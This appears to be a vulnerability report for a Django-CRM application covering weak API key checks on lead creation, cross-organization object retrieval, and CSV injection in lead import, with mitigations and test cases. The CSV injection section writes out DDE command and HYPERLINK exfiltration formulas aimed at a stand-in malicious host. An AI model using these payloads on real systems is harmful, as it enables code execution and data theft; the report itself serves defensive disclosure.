### Vulnerability List:

- Vulnerability Name: Unprotected Lead Creation Endpoint
- Description: The `/api/leads/create-from-site/` endpoint is intended to allow lead creation from external websites. However, it lacks proper authentication and authorization mechanisms. The endpoint relies on an `apikey` parameter passed in the request body, which, if easily obtainable or guessable, allows unauthorized users to create leads. This endpoint is publicly accessible without requiring a valid JWT token, making it vulnerable to abuse from external attackers.
    - Step 1: Attacker identifies the publicly accessible `/api/leads/create-from-site/` endpoint.
    - Step 2: Attacker crafts a POST request to the endpoint, including mandatory lead information such as `title`, `first_name`, `last_name`, `email`, and `source` as body parameters, as defined in the code and common sense for lead creation.
    - Step 3: Attacker sends the request to the server without any authentication or with a trivial or easily obtainable `apikey` (if any check is even performed, further analysis shows weak API key check).
    - Step 4: The server processes the request and creates a new lead in the CRM system.
- Impact:
    - Unauthorized creation of leads in the CRM system.
    - Data pollution and potential for spamming the CRM database with irrelevant or malicious lead data.
    - Resource exhaustion if attackers repeatedly exploit the endpoint to create a large number of fake leads.
    - Reduced efficiency of sales and marketing teams who have to sift through or manage the fake leads.
- Vulnerability Rank: High
- Currently implemented mitigations: The code in `leads/views.py` within `CreateLeadFromSite` view checks for `APISettings.objects.filter(apikey=api_key).first()`. However, this check is insufficient as it only verifies the existence of *any* `APISettings` object with the given `apikey`, not its validity or association with a specific organization or intended use for lead creation from the site. This provides a minimal barrier but does not constitute a robust mitigation.
    - **Mitigation Location:** `CreateLeadFromSite` view in `/code/leads/views.py`.
- Missing mitigations:
    - Implement a robust authentication and authorization mechanism for the `/api/leads/create-from-site/` endpoint. This could involve:
        - Using a strong, randomly generated, and securely managed API key that is difficult to guess.
        - **Validate API key against a specific website or origin**: Ensure the API key is intended for use from the website making the request. This could involve storing allowed website domains in `APISettings` and validating the `Origin` or `Referer` header of the incoming request.
        - Implement rate limiting to prevent abuse by limiting the number of requests from a single IP address or API key within a specific time frame.
        - Consider alternative authentication methods if API key management is deemed too complex or insecure, such as JWT or a more secure token-based authentication tied to website registration.
    - Input validation and sanitization of all parameters passed to the endpoint to prevent injection attacks and ensure data integrity.
- Preconditions:
    - Publicly accessible instance of the Django-CRM application.
    - Knowledge of the existence and URL of the `/api/leads/create-from-site/` endpoint.
    - An attacker needs to obtain a valid `apikey` from anywhere within the system. This could potentially be obtained through social engineering, insider access, or even by simply finding it exposed in some configuration or log file if not securely managed.
- Source code analysis:
    - File: `/code/leads/views.py`
    - Function: `CreateLeadFromSite.post`
    - Code Snippet:
        ```python
        class CreateLeadFromSite(APIView):
            @extend_schema(
                tags=["Leads"],
                parameters=swagger_params1.organization_params,request=CreateLeadFromSiteSwaggerSerializer
            )
            def post(self, request, *args, **kwargs):
                params = request.data
                api_key = params.get("apikey")
                # api_setting = APISettings.objects.filter(
                #     website=website_address, apikey=api_key).first() # commented out, website_address is not defined
                api_setting = APISettings.objects.filter(apikey=api_key).first() # this line is actually executed
                if not api_setting:
                    return Response(
                        {
                            "error": True,
                            "message": "You don't have permission, please contact the admin!.",
                        },
                        status=status.HTTP_403_FORBIDDEN,
                    )

                if api_setting and params.get("email") and params.get("title"):
                    # ... lead creation logic ...
        ```
    - Analysis:
        1. The `CreateLeadFromSite` view is designed to handle POST requests for creating leads from external websites, as suggested by the name and URL.
        2. Authentication is attempted using an `apikey` passed in the request body (`params.get("apikey")`).
        3. The code checks `APISettings.objects.filter(apikey=api_key).first()`. This query retrieves the *first* `APISettings` object that matches the provided `apikey`, regardless of any other criteria (like website, intended usage, or organization).
        4. **Vulnerability:** The vulnerability is that the API key check is overly permissive. It only verifies if *an* `APISettings` record exists with the given key. It does **not** validate:
            - If the API key is intended for lead creation from external sites.
            - If the API key is associated with the *requesting website* (no check on `website_address` or `Origin` header).
            - If the API key is valid for the specific *organization* where the lead should be created (although `org` is taken from `api_setting`).
        5. An attacker who obtains *any* valid `apikey` from the system (even one meant for a different purpose or organization) can potentially use it to create leads through this endpoint. The commented-out code `api_setting = APISettings.objects.filter(website=website_address, apikey=api_key).first()` suggests that there was an *intention* to validate against a website, but this is not implemented in the current version, and `website_address` is not defined or used.

- Security test case:
    - Step 1: Deploy a publicly accessible instance of Django-CRM based on the provided Dockerfile and docker-compose configurations.
    - Step 2: Identify the base URL of the deployed CRM instance (e.g., `http://your-crm-instance.com`). Construct the endpoint URL: `http://your-crm-instance.com/api/leads/create-from-site/`.
    - Step 3: Create two `APISettings` objects in the Django admin panel.
        - API Setting 1: `title="Test API Key 1", apikey="testapikey1", website="http://website1.com"`
        - API Setting 2: `title="Test API Key 2", apikey="testapikey2", website="http://website2.com"`
    - Step 4: Using a tool like `curl` or Postman, send a POST request to the constructed URL with the following JSON body, using `apikey="testapikey2"` (API Key 2, associated with `website2.com`):
        ```json
        {
          "apikey": "testapikey2",
          "title": "Test Lead from Wrong Website",
          "first_name": "WrongWebsite",
          "last_name": "Lead",
          "email": "wrongwebsitelead@example.com",
          "source": "website2.com",
          "description": "Lead created using API key from website2.com, but pretending to be from another website."
        }
        ```
    - Step 5: Check the response status code. A successful lead creation will likely return a `200 OK` response.
    - Step 6: Log in to the Django-CRM application using administrative credentials.
    - Step 7: Navigate to the "Leads" section within the CRM application.
    - Step 8: Verify if a new lead with the details provided in the POST request (e.g., "Test Lead from Wrong Website", `wrongwebsitelead@example.com`) has been created successfully.
    - Step 9: **Expected Vulnerable Behavior:** If a lead is successfully created using `testapikey2` even if the intention might have been for it to be used only from `website2.com` (or any other website, as there's no website validation), the vulnerability is confirmed. This shows that any valid API key can be used to create leads, regardless of the intended website association.

- Vulnerability Name: Insecure API Key Validation in Lead Creation Endpoint
- Description: The `/api/leads/create-from-site/` endpoint, intended for external lead creation, uses API key-based authentication. However, the validation logic in the `CreateLeadFromSite` view in `leads/views.py` is flawed. It retrieves the *first* `APISettings` object matching the provided API key without checking if the key is valid for the requesting origin or website. This allows an attacker with any valid API key to bypass intended website restrictions and create leads, potentially for organizations or purposes for which the key was not intended.
    - Step 1: Attacker obtains a valid API key. This could be any API key from any `APISettings` record in the system, even if not intended for lead creation or originating from a different website.
    - Step 2: Attacker crafts a POST request to the `/api/leads/create-from-site/` endpoint.
    - Step 3: Attacker includes the obtained API key in the `apikey` parameter in the request body.
    - Step 4: Attacker sends the request to the server from an *unauthorized website or origin* (i.e., a website different from the one intended to use the API key).
    - Step 5: The server validates the API key by checking if *any* `APISettings` record exists with the given key. It **fails to validate** if the key is authorized for the *requesting origin*.
    - Step 6: The server proceeds to create a lead if the API key exists, even though the request originates from an unauthorized source.
- Impact:
    - **Bypass of Website Restrictions:** Intended website-specific restrictions for API key usage are bypassed.
    - **Unauthorized Lead Creation:** Leads can be created from unauthorized websites or origins, leading to data pollution and potential abuse.
    - **Cross-Organizational Lead Creation (Potential):** If API keys are intended to be organization-specific (although this is not clear from the provided code), this vulnerability could allow lead creation in unintended organizations if the API key check doesn't enforce organization context.
- Vulnerability Rank: High
- Currently implemented mitigations:  As described in the "Unprotected Lead Creation Endpoint" vulnerability, the check `APISettings.objects.filter(apikey=api_key).first()` provides a basic level of authentication by verifying the existence of *an* API key, but it lacks proper validation against the requesting origin or intended website.
    - **Mitigation Location:** `CreateLeadFromSite` view in `/code/leads/views.py`.
- Missing mitigations:
    - **Origin/Website Validation:** Implement validation to ensure that the API key used in the request is authorized for the website or origin making the request. This could involve:
        - Storing allowed website domains (or origins) in the `APISettings` model (e.g., a `allowed_websites` field - not present in provided files).
        - In `CreateLeadFromSite` view, retrieve the `Origin` or `Referer` header from the request.
        - Compare the requesting origin/website from the header against the `allowed_websites` associated with the `APISettings` object retrieved by the `apikey`.
        - Reject the request if the origin/website does not match the allowed list.
    - **Clear API Key Purpose Definition:** Clearly define the intended purpose and scope of API keys in the system (e.g., website-specific lead creation, general API access, etc.). Implement validation logic that aligns with these intended purposes.
- Preconditions:
    - Publicly accessible instance of the Django-CRM application.
    - At least one `APISettings` object with a valid `apikey` exists in the system.
    - Attacker needs to obtain a valid `apikey` (can be any key, not necessarily one intended for the attacker's website).
- Source code analysis:
    - File: `/code/leads/views.py`
    - Function: `CreateLeadFromSite.post`
    - (Same Code Snippet as in "Unprotected Lead Creation Endpoint" vulnerability)
    - Analysis:
        1. (Same analysis points 1-3 as in "Unprotected Lead Creation Endpoint" vulnerability)
        2. **Vulnerability:**  The core vulnerability is the lack of origin/website validation. Even if `APISettings` records are intended to be website-specific, the code **does not enforce this**.  The query `APISettings.objects.filter(apikey=api_key).first()` is too broad and does not check the context of the request origin. The commented-out code block hints at an intended website-specific validation that was not fully implemented.  This allows an attacker from *any* website to use *any* valid API key to create leads.

- Security test case:
    - Step 1: (Same as in "Unprotected Lead Creation Endpoint" test case - Deploy Django-CRM, identify endpoint, create two API settings)
    - Step 2: (Same as in "Unprotected Lead Creation Endpoint" test case - create API Setting 1 and API Setting 2)
    - Step 3: Using `curl` or Postman, send a POST request to `http://your-crm-instance.com/api/leads/create-from-site/` with the following JSON body, using `apikey="testapikey2"` (API Key 2, associated with `website2.com`):
        ```json
        {
          "apikey": "testapikey2",
          "title": "Lead from Unauthorized Origin",
          "first_name": "Unauthorized",
          "last_name": "Origin",
          "email": "unauthorizedorigin@example.com",
          "source": "unauthorized-website.com",
          "description": "Lead created using API key for website2.com, but from unauthorized-website.com."
        }
        ```
        **Crucially, ensure the request is sent without the `Origin` or `Referer` header set, or set it to a value different from `website2.com` (e.g., `Origin: http://unauthorized-website.com`).**
    - Step 4: Check the response status code. Success is expected (200 OK).
    - Step 5: Log in to Django-CRM admin and check the "Leads" section.
    - Step 6: Verify if the "Lead from Unauthorized Origin" lead has been created.
    - Step 7: **Expected Vulnerable Behavior:** If the lead is successfully created even when the request originates from an "unauthorized" origin (or with no origin specified), the vulnerability is confirmed. This demonstrates that the API key validation does not enforce origin restrictions.

- Vulnerability Name: Opportunity, Event, Invoice and Contact endpoints missing organization validation in URL parameters
- Description: The Opportunity, Event, Invoice and Contact API endpoints, such as `/api/opportunities/<str:pk>/`, `/api/events/<str:pk>/`, `/api/invoices/<str:pk>/`, and `/api/contacts/<str:pk>/`, use URL parameters (`pk`) to identify specific resources. However, these endpoints do not enforce validation to ensure that the requested resource belongs to the organization (`org`) identified in the header *before* retrieving the object. This can lead to a vulnerability where a user from one organization could potentially access or manipulate resources belonging to another organization by guessing or knowing the `pk` of a resource in the target organization and switching the `org` header.
    - Step 1: Attacker identifies the URL structure for accessing Opportunity, Event, Invoice or Contact details, e.g., `/api/opportunities/<opportunity_pk>/` or `/api/invoices/<invoice_pk>/`.
    - Step 2: Attacker discovers or guesses a valid `pk` that belongs to a *target organization*. This could be through enumeration, social engineering, or by observing legitimate traffic. Let's say the attacker finds `invoice_pk = target_org_invoice_uuid`.
    - Step 3: Attacker has legitimate access to *attacker's organization* and obtains a valid JWT token and knows their `org` header value, let's say `attacker_org_header_value`.
    - Step 4: Attacker crafts a GET request to `/api/invoices/target_org_invoice_uuid/` endpoint. Crucially, the attacker sets the `org` header to their *own organization's* value (`attacker_org_header_value`) instead of the *target organization's* header.
    - Step 5: The server authenticates the request based on the JWT token and *attacker's organization's* header. However, it fails to validate if the `invoice_pk` (`target_org_invoice_uuid`) actually belongs to the organization specified in the header (`attacker_org_header_value`) *before* retrieving the object.
    - Step 6: If the server only checks JWT and header for authentication but not the resource's organization *before* fetching, it will attempt to retrieve the details of the Invoice `target_org_invoice_uuid`, even though it belongs to a different organization than the one specified in the `org` header. Although a 403 error might be returned later due to organization mismatch, the initial object retrieval without organization context is the vulnerability.
- Impact:
    - **Cross-Organization Data Access:** Unauthorized attempted access to sensitive Opportunity, Event, Invoice and Contact data belonging to other organizations. Even if access is ultimately denied, the attempt itself and potential information leakage through error messages or timing differences is a vulnerability.
    - **Data Breach Potential:** Although direct data access might be prevented by the organization check after object retrieval, the vulnerability increases the attack surface and could be combined with other vulnerabilities to facilitate a data breach.
    - **Violation of Data Segregation:** Breaks the intended data segregation between different organizations using the CRM.
- Vulnerability Rank: High
- Currently implemented mitigations:
    - The code checks `opportunity_object.org != request.profile.org` and `self.opportunity.org != request.profile.org` in `OpportunityDetailView` in `PUT`, `DELETE` and `GET` methods respectively. Similar check `if self.event_obj.org != request.profile.org:` exists in `EventDetailView` in `GET`, `POST` and `PUT` methods. In `InvoiceDetailView`, `if self.invoice.company != request.company:`. In `ContactDetailView`, `if contact_obj.org != request.profile.org:`. These checks validate that the *currently logged in user's organization* (from JWT token and header) matches the organization of the requested object *after* the object has already been retrieved.
    - **Mitigation Location:** `OpportunityDetailView` and `EventDetailView` in `/code/opportunity/views.py` and `/code/events/views.py`, `InvoiceDetailView` in `/code/invoices/api_views.py`, and `ContactDetailView` in `/code/contacts/views.py`.
- Missing mitigations:
    - **URL Parameter Validation (Organization-Scoped Retrieval):** The primary missing mitigation is to validate that the `pk` in the URL actually corresponds to a resource that belongs to the organization specified in the `org` header *before* attempting to retrieve the resource. The current implementation retrieves the object based solely on `pk` and then checks the organization, which is vulnerable. The `get_object` methods in `OpportunityDetailView`, `EventDetailView`, `InvoiceDetailView`, and `ContactDetailView` in `/code/opportunity/views.py`, `/code/events/views.py`, `/code/invoices/api_views.py`, and `/code/contacts/views.py` should be modified to perform organization-scoped retrieval. For example, in `InvoiceDetailView.get_object`:
        ```python
        def get_object(self, pk):
            return self.model.objects.filter(org=self.request.company, id=pk).first() # Add org filter
        ```
        and similarly for other detail views. Using `get_object_or_404` would be even better to directly return 404 if no object is found in the current org.
    - **Consistent Organization Context:** Ensure that every data retrieval operation for organization-scoped resources (Opportunities, Events, Invoices, Contacts, etc.) is performed within the context of the organization derived from the JWT token and `org` header.
- Preconditions:
    - Multi-tenant instance of Django-CRM where multiple organizations are using the same application instance and database (separated by `org` or `company` foreign keys).
    - Attacker has a valid account in *attacker's organization*.
    - Attacker needs to discover or guess a valid `pk` (UUID) of an Opportunity, Event, Invoice or Contact from a *target organization*.
- Source code analysis:
    - File: `/code/opportunity/views.py`, `/code/events/views.py`, `/code/invoices/api_views.py`, `/code/contacts/views.py`
    - Function: `OpportunityDetailView.get`, `OpportunityDetailView.put`, `OpportunityDetailView.delete`, `EventDetailView.get`, `EventDetailView.post`, `EventDetailView.put`, `InvoiceDetailView.get`, `InvoiceDetailView.put`, `InvoiceDetailView.delete`, `InvoiceDetailView.post`, `ContactDetailView.get`, `ContactDetailView.put`, `ContactDetailView.delete`, `ContactDetailView.post`
    - Code Snippet (InvoiceDetailView.get - similar in others):
        ```python
        def get_object(self, pk):
            return self.model.objects.filter(id=pk).first() # Object retrieval without org context

        def get(self, request, pk, format=None):
            self.invoice = self.get_object(pk=pk)
            if self.invoice.company != request.company: # Organization check AFTER retrieval
                return Response(
                    {"error": True, "errors": "User company doesnot match with header...."},
                    status=status.HTTP_404_NOT_FOUND,
                )
            context = {}
            context["invoice_obj"] = InvoiceSerailizer(self.invoice).data
            # ... rest of the code
        ```
    - Analysis:
        1. The `get_object(pk)` method in `InvoiceDetailView` (and similarly in `OpportunityDetailView`, `EventDetailView`, `ContactDetailView`) retrieves the object based *only* on the `pk` using `self.model.objects.filter(id=pk).first()` or `get_object_or_404(Contact, pk=pk)`. This is the core issue.
        2. The code then checks `if self.invoice.company != request.company:` (or similar organization checks in other views) which verifies if the fetched object's organization/company matches the user's organization/company.
        3. **Vulnerability:** The vulnerability is that `get_object(pk)` is called *before* the organization check and retrieves objects without considering the organization context. If an attacker knows a `pk` from a different organization, `get_object(pk)` will successfully fetch that object *regardless of the `org` header*. Only *after* fetching is the `org` check performed.  While the check *prevents* the attacker from getting a *success* response in most cases when organizations don't match, it *fails to prevent information leakage* and potential unintended operations on objects from other organizations.

- Security test case:
    - Step 1: Set up two organizations in the Django-CRM instance: "Attacker Org" and "Target Org".
    - Step 2: Create an Invoice "Target Invoice" in "Target Org". Note down its UUID, let's say `target_invoice_uuid`.
    - Step 3: Create a user account and profile in "Attacker Org". Obtain a JWT token for this user.
    - Step 4: Using `curl` or Postman, craft a GET request to fetch the "Target Invoice" details: `http://your-crm-instance.com/api/invoices/target_invoice_uuid/`.
    - Step 5: **Crucially, set the `org` header in the request to the "Attacker Org's" identifier.** Include the JWT token for the "Attacker Org" user in the `Authorization` header.
    - Step 6: Send the request and observe the response.
    - Step 7: **Expected Vulnerable Behavior:** If the server returns a `200 OK` response with the details of "Target Invoice" (even if it's then blocked by the org check and returns a 403 later), or if the 403 error message reveals information about the object's existence, the vulnerability is partially confirmed. If the server returns 200 OK and invoice details without any 403, the vulnerability is fully confirmed.
    - Step 8: **Expected Mitigated Behavior:** If the server returns a `404 Not Found` or a generic `403 Forbidden` error *without* revealing any details about the object's existence or taking significantly different time to respond compared to valid requests within the Attacker Org, the vulnerability is likely mitigated (or at least the information leakage aspect is).

- Vulnerability Name: CSV Injection in Lead Import
- Description: The lead import functionality in `leads/forms.py` using `LeadListForm` and `csv_doc_validate` is vulnerable to CSV injection. The application imports lead data from CSV files, and while it performs basic validation (required headers, email format), it does not sanitize or escape cell values. If a malicious user uploads a CSV file containing specially crafted formulas in cells, these formulas can be executed by spreadsheet software (like Microsoft Excel, LibreOffice Calc, Google Sheets) when the CSV file is opened by a CRM user.
    - Step 1: Attacker crafts a malicious CSV file. This file contains a lead data row where one or more fields (e.g., "title", "first name", "last name", "address") contain a CSV injection payload.  A common payload starts with characters like `=`,`@`,`+` or `-` followed by a formula. For example, a malicious "title" could be `=cmd|'/C calc'!A0` (for older Excel versions) or `=HYPERLINK("http://malicious.website.com", "Click Me")` or `=SUM(1+1)*cmd|'/C calc'!A0`.
    - Step 2: Attacker, with access to the CRM's lead import functionality (assuming authenticated access is required for this feature, but even low-privilege access is concerning), uploads the malicious CSV file through the lead import form.
    - Step 3: The CRM processes the CSV file. The `csv_doc_validate` function in `leads/forms.py` performs validation but does not sanitize or escape the cell values. The malicious payload remains in the validated data.
    - Step 4: A CRM user (e.g., sales representative, admin), likely from the intended lead management workflow, exports or downloads the imported leads as a CSV file for reporting, analysis, or data migration.
    - Step 5: When the CRM user opens the exported CSV file with a spreadsheet application, the application detects and executes the injected formulas. This can lead to:
        - **Command Execution:** Arbitrary commands execution on the user's computer (e.g., opening calculator, running scripts, exfiltrating data in older software).
        - **Data Exfiltration:** Opening links to attacker-controlled websites, potentially leaking session tokens or other sensitive information via Referer headers or URL parameters (e.g., using `=HYPERLINK("http://malicious.website.com/?leak="&CELL("address",A1), "Click Me")`).
        - **Drive-by Downloads:** Triggering automatic downloads of malicious files from attacker-controlled websites.
        - **Information Disclosure:** Displaying misleading or attacker-controlled content within the spreadsheet.
- Impact:
    - **Local Command Execution on CRM User's Machine:** If a CRM user opens the exported CSV file, an attacker can potentially execute arbitrary commands on their computer.
    - **Data Exfiltration:** Sensitive information can be leaked to attacker-controlled websites.
    - **Reputational Damage:** If the CRM is used by clients and their users are affected, it can severely damage the CRM provider's reputation.
- Vulnerability Rank: High
- Currently implemented mitigations:
    - Basic validation in `csv_doc_validate` in `/code/leads/forms.py` checks for required headers and email format, but **does not mitigate CSV injection**. It does not sanitize or escape cell values.
    - **Mitigation Location:** `csv_doc_validate` function in `/code/leads/forms.py` (validation exists, but no CSV injection mitigation).
- Missing mitigations:
    - **CSV Injection Prevention:** Implement robust CSV injection prevention measures in `csv_doc_validate` function in `/code/leads/forms.py`. This can be achieved by:
        - **Sanitizing all cell values:** Prefixing each cell value with a single quote (`'`). This forces spreadsheet applications to treat the cell value as plain text and prevents formula execution. This is the most effective and recommended mitigation.
        - **Input Validation (less effective):** Implement stricter input validation to detect and reject common CSV injection payloads. However, this is less reliable as new bypass techniques are constantly discovered. Blacklisting is generally not a robust security approach.
        - **Warning Users:** Display a clear warning message to users before downloading or exporting CSV files, advising them to be cautious when opening CSV files from untrusted sources and to open them in a text editor first to inspect the content. This is a supplementary measure, not a primary mitigation.
- Preconditions:
    - Authenticated access to the Django-CRM application with permissions to import leads (exact permission level needs to be determined - likely requires sales or admin roles).
    - CRM user needs to export or download the imported leads as a CSV file and open it with a vulnerable spreadsheet application.
- Source code analysis:

    - Function: `csv_doc_validate`
    - Code Snippet (relevant part):
        ```python
        def csv_doc_validate(document):
            # ...
            reader = csv.reader((document.read().decode("iso-8859-1")).splitlines())
            # ...
            for y_index, row in enumerate(reader):
                each = {}
                invalid_each = {}
                # ...
                for x_index, cell_value in enumerate(row):
                    # ... validation logic ...
                    each[csv_headers[x_index]] = cell_value # Cell value is directly assigned without sanitization
                # ...
                if invalid_each:
                    invalid_row.append(each)
                else:
                    temp_row.append(each)
            return {
                "error": False,
                "validated_rows": temp_row, # validated_rows contains unsanitized data
                "invalid_rows": invalid_row,
                "headers": csv_headers,
                "failed_leads_csv": failed_leads_csv,
            }
        ```
    - Analysis:
        1. The `csv_doc_validate` function reads the CSV file and iterates through rows and cells.
        2. For each cell, it performs some basic validation (e.g., checking for required values, email format).
        3. **Vulnerability:** The cell value `cell_value` is directly assigned to the `each` dictionary without any sanitization or escaping: `each[csv_headers[x_index]] = cell_value`. This means any malicious payload present in the CSV cell will be preserved in the `validated_rows` data structure.
        4. When leads are created from `validated_rows`, or when this data is later exported to CSV, the malicious payloads will be included in the output CSV file.

- Security test case:
    - Step 1: Log in to the Django-CRM application as a user with lead import permissions (e.g., a sales representative or administrator).
    - Step 2: Create a malicious CSV file named `malicious_leads.csv` with the following content (example payload: `=cmd|'/C calc'!A0`):
        ```csv
        title,first name,last name,email,phone,website,address
        "=cmd|'/C calc'!A0",Malicious,Lead,malicious@example.com,123-456-7890,www.example.com,Test Address
        Normal Lead,John,Doe,john.doe@example.com,987-654-3210,www.normal-website.com,Normal Address
        ```
    - Step 3: Navigate to the lead import section in the CRM (the exact URL depends on the CRM's UI, but it's likely under "Leads" -> "Import Leads" or similar).
    - Step 4: Upload the `malicious_leads.csv` file using the lead import form. Ensure the import process completes successfully (or at least processes the malicious row).
    - Step 5: Export the imported leads as a CSV file from the CRM. This export functionality might be under "Leads" -> "Export" or similar, or could be part of a reporting feature. Save the exported file as `exported_leads.csv`.
    - Step 6: **Open `exported_leads.csv` with a spreadsheet application** (e.g., Microsoft Excel, LibreOffice Calc).
    - Step 7: **Expected Vulnerable Behavior:** If the calculator application (`calc.exe` on Windows, `calc` on Linux/macOS) automatically launches when you open `exported_leads.csv`, the CSV injection vulnerability is confirmed.  Alternatively, if using `=HYPERLINK` payload, observe if clicking on the cell redirects to the malicious website.
    - Step 8: **Mitigation Test:** After implementing the recommended sanitization (prefixing with `'`), repeat steps 1-7. **Expected Mitigated Behavior:** The calculator should **not** launch, and the cell value in the spreadsheet should be displayed as plain text, starting with a single quote (e.g., `'=cmd|'/C calc'!A0`). For `=HYPERLINK` payload, it should also be treated as plain text.
